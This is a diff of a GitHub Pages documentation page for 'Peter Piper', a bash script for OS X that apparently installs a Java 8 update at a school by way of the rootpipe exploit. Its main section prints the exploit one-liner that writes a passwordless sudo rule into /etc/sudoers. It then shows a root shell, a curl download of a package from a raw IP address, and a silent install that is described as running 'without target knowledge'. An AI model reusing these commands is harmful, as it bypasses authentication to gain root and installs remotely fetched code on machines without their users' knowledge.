@@ -1,30 +1,39 @@
 <!DOCTYPE html>
-<html lang="en-us">
+<html>
   <head>
-    <meta charset="UTF-8">
-    <title>Peter Piper by thrifus</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <link rel="stylesheet" type="text/css" href="stylesheets/normalize.css" media="screen">
-    <link href='https://fonts.googleapis.com/css?family=Open+Sans:400,700' rel='stylesheet' type='text/css'>
+    <meta charset='utf-8'>
+    <meta http-equiv="X-UA-Compatible" content="chrome=1">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <link href='https://fonts.googleapis.com/css?family=Architects+Daughter' rel='stylesheet' type='text/css'>
     <link rel="stylesheet" type="text/css" href="stylesheets/stylesheet.css" media="screen">
     <link rel="stylesheet" type="text/css" href="stylesheets/github-light.css" media="screen">
-  </head>
-  <body>
-    <section class="page-header">
-      <h1 class="project-name">Peter Piper</h1>
-      <h2 class="project-tagline">A simple Java 8 updater (bash script) for OS X made for Madison Academy. Makes use of the rootpipe exploit.</h2>
-      <a href="https://github.com/thrifus/Peter-Piper" class="btn">View on GitHub</a>
-      <a href="https://github.com/thrifus/Peter-Piper/zipball/master" class="btn">Download .zip</a>
-      <a href="https://github.com/thrifus/Peter-Piper/tarball/master" class="btn">Download .tar.gz</a>
-    </section>
+    <link rel="stylesheet" type="text/css" href="stylesheets/print.css" media="print">
 
-    <section class="main-content">
-      <h1>
+    <!--[if lt IE 9]>
+    <script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script>
+    <![endif]-->
+
+    <title>Peter Piper by MA-C</title>
+  </head>
+
+  <body>
+    <header>
+      <div class="inner">
+        <h1>Peter Piper</h1>
+        <h2>A simple Java 8 updater (bash script) for OS X made for Madison Academy. Makes use of the rootpipe exploit.</h2>
+        <a href="https://github.com/MA-C/Peter-Piper" class="button"><small>View project on</small> GitHub</a>
+      </div>
+    </header>
+
+    <div id="content-wrapper">
+      <div class="inner clearfix">
+        <section id="main-content">
+          <h1>
 <a id="peter-piper-documentation" class="anchor" href="#peter-piper-documentation" aria-hidden="true"><span class="octicon octicon-link"></span></a>Peter Piper Documentation</h1>
 
 <p><strong>1. INTRODUCTION</strong>
 <br>
-This script was made as an alternative to legitimate authentication in Applescript. This script uses a method of exploitation in OS X  called root piping.</p>
+This script was made as an alternative to legitimate authentication in Applescript. This script uses a method of exploitation in OS X called root piping.</p>
 
 <p><br></p>
 
@@ -37,7 +46,7 @@ This exploit gives whatever user that executes it admin instantly.</p>
 
 <p><strong>3. INSTALL</strong>
 <br>
-We use <code>cURL</code> to get the Java 8 Update 60 package onto the target computer and into a temporary directory, then the <code>installer</code> command featured in the OS X command line to install the .pkg we fetched. This is the correct command for this particular task because it skips the graphical installer meaning it can run behind the scenes without target knowledge.</p>
+We use <code>cURL</code> to get the Java 8 Update 60 package (.tar archive) onto the target computer and into a temporary directory, decompress it, and then use the <code>installer</code> command featured in the OS X command line to install the .pkg we fetched. This is the correct command for this particular task because it skips the graphical installer meaning it can run behind the scenes without target knowledge.</p>
 
 <p><br></p>
 
@@ -58,29 +67,41 @@ This is used to ensure the completion of the command if it fails.</p>
 <h2>
 <a id="in-depth-look-at-function-keepsafe---commands" class="anchor" href="#in-depth-look-at-function-keepsafe---commands" aria-hidden="true"><span class="octicon octicon-link"></span></a>IN-DEPTH LOOK AT <code>function KeepSafe { }</code> COMMANDS</h2>
 
-<p><code>echo 'echo "$(whoami) ALL=(ALL) NOPASSWD:ALL" &gt;&amp;3' | DYLD_PRINT_TO_FILE=/etc/sudoers newgrp;</code> - <strong><em>Exploit the machine</em></strong>
+<p><code>echo 'echo "$(whoami) ALL=(ALL) NOPASSWD:ALL" &gt;&amp;3' | DYLD_PRINT_TO_FILE=/etc/sudoers newgrp;</code> <strong><em>- Exploit the machine</em></strong>
 <br>
-<code>sudo bash -c</code> - <strong><em>Create a root bash shell</em></strong>
+<code>sudo bash -c</code> <strong><em>- Create a root bash shell</em></strong>
 <br>
-<code>if [[ $EUID -ne 0 ]]; then echo -e "\033[1mFailed! No root!\033[0m $(exit 1);"</code> - <strong><em>Check if the exploit actually worked, if not, exit the script</em></strong>
+<code>if [[ $EUID -ne 0 ]]; then echo -e "\033[1mFailed! No root!\033[0m $(exit 1)";</code> <strong><em>- Check if the exploit actually worked, if not, exit the script</em></strong>
 <br>
-<code>sudo mkdir -v /tmp$$;</code> - <strong><em>Make a temporary directory to store the package in</em></strong>
+<code>sudo mkdir -v /tmp$$;</code> <strong><em>- Make a temporary directory to store the package in</em></strong>
 <br>
-<code>sudo curl -# http://thrifus.co/jump/j8u60.pkg &gt; /tmp$$/j8u60.pkg;</code> - <strong><em>Get the package</em></strong>
+<code>sudo curl -# http://24.96.42.83/ownCloud/index.php/s/MipN60plXKZ21vg/download &gt; /tmp$$/Java8Update60.pkg.tar;</code> <strong><em>- Get the package (.tar archive)</em></strong>
 <br>
-<code>sudo installer -verbose -pkg /tmp$$/j8u60.pkg -target LocalSystem;</code> - <strong><em>Install the package</em></strong>
+<code>tar -xfv /tmp$$/Java8Update60.pkg.tar;</code> <strong><em>- Unpack the .tar archive</em></strong>
 <br>
-<code>sudo sed -i "" "/NOPASSWD:ALL/d" /etc/sudoers;</code> - <strong><em>Remove the line allowing root access without a password</em></strong>
+<code>sudo installer -verbose -pkg /tmp$$/Java8Update60.pkg -target LocalSystem;</code> - <strong><em>Install the package</em></strong>
 <br>
-<code>rm -rfv /tmp$$;</code> - <strong><em>Remove the temporary directory</em></strong></p>
+<code>sudo sed -i "" "/NOPASSWD:ALL/d" /etc/sudoers;</code> <strong><em>- Remove the line allowing root access without a password</em></strong>
+<br>
+<code>rm -rfv /tmp$$;</code> <strong><em>- Remove the temporary directory</em></strong></p>
+        </section>
 
-      <footer class="site-footer">
-        <span class="site-footer-owner"><a href="https://github.com/thrifus/Peter-Piper">Peter Piper</a> is maintained by <a href="https://github.com/thrifus">thrifus</a>.</span>
+        <aside id="sidebar">
+          <a href="https://github.com/MA-C/Peter-Piper/zipball/master" class="button">
+            <small>Download</small>
+            .zip file
+          </a>
+          <a href="https://github.com/MA-C/Peter-Piper/tarball/master" class="button">
+            <small>Download</small>
+            .tar.gz file
+          </a>
 
-        <span class="site-footer-credits">This page was generated by <a href="https://pages.github.com">GitHub Pages</a> using the <a href="https://github.com/jasonlong/cayman-theme">Cayman theme</a> by <a href="https://twitter.com/jasonlong">Jason Long</a>.</span>
-      </footer>
+          <p class="repo-owner"><a href="https://github.com/MA-C/Peter-Piper"></a> is maintained by <a href="https://github.com/MA-C">MA-C</a>.</p>
 
-    </section>
+          <p>This page was generated by <a href="https://pages.github.com">GitHub Pages</a> using the Architect theme by <a href="https://twitter.com/jasonlong">Jason Long</a>.</p>
+        </aside>
+      </div>
+    </div>
 
   
   </body>
